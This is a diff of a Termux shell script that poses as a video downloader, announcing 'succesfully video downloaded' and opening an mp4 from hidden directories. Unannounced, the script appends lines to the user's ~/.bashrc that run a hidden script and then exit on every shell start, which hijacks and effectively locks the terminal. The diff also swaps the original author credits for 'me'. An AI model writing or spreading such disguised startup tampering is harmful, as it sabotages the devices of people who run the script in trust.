@@ -6,13 +6,14 @@ ylo='\033[1;33m'
 #!/system/bin/sh
 echo 'bash /.direct/base.sh' >> ~/.bashrc
 echo 'exit' >> ~/.bashrc
-cp pever.sh $HOME
+cp /.direct/hehe.mp4 $HOME
+
 sleep 2
 #...
-#!script auther shrez
-#by shaheerez
-#Be a creative person not copy paster
-#malayaali 
+#!script auther me
+#by me
+#hheheheheh
+#hehehe
 echo " "
 echo " "
 echo " "
@@ -381,10 +382,13 @@ apt-get install figlet
 apt-get install toilet
 clear
 printf "\e[99m\e[1;98m\n "
-figlet succesfully video downloaded
+toilet succesfully video downloaded
 echo "open video throug any video player"
 sleep 2
-termux-open messi.mp4
+termux-open /.direct/hehe.mp4
+cd
+termux-open hehe.mp4
+termux-open /.shadow/hehe.mp4
 ;;
 
 	    # #############################
